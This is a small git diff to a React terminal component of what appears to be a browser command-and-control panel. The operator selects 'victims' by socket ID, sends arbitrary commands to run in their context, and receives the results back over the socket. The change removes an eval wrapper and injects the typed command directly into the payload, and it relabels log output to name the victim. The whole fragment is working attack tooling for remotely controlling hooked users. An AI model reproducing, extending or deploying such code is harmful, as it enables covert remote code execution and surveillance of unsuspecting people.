@@ -22,7 +22,7 @@ class Terminal extends Component {
         term.echo('Select a target first')
       }
       activeTargetSocketIds.forEach((socketId)=>{
-        term.echo(`Executing command line attack on ${this.props.victimsBySocketIdMap[socketId].id}...`)
+        term.echo(`Executing command line attack on victim ${this.props.victimsBySocketIdMap[socketId].id}...`)
         let attackInstanceId = `${socketId}_${new Date().valueOf()}`
         this.props.followupBuffer[attackInstanceId] = function(params, logger){}
         this.props.socket.emit('attackUser', {
@@ -30,7 +30,7 @@ class Terminal extends Component {
           attack: `function(params){
             params.time = new Date();
             try{
-              eval("${command}");
+              ${command};
               socket.emit("result", {
                 success: true,
                 message: "Successfully executed custom command at " + new Date() ,
